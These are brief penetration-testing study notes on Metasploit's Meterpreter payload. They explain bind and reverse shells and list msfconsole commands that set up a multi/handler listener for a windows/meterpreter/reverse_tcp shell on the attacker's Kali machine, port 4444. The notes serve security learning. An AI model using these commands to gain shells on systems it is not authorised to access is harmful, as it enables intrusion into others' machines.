Meterpreter
#BASICS

Meterpreter is a Metasploit attack payload that provides an interactive shell from which an attacker 
can explore the target machine and execute code. Meterpreter is deployed using in-memory DLL injection.

Meterpreter uses a reverse_tcp shell, which means it connects to a listener on the attacker’s machine. 
There are two popular types of shells: bind and reverse. A bind shell opens up a new service on the 
target machine, and requires the attacker to connect to it in order to start a session. 
A reverse shell (also known as a connect-back) requires the attacker to first set up a listener to 
which the target machine can connect.

-> Example of use
Start the reverse TCP.
  msf6> use exploit/multi/handler
  msf6> info
  msf6> show options
  msf6> set LHOST <kali ip>
  msf6> set payload windows/meterpreter/reverse_tcp

2. Kali is waiting for reverse connection on <kali ip>:4444
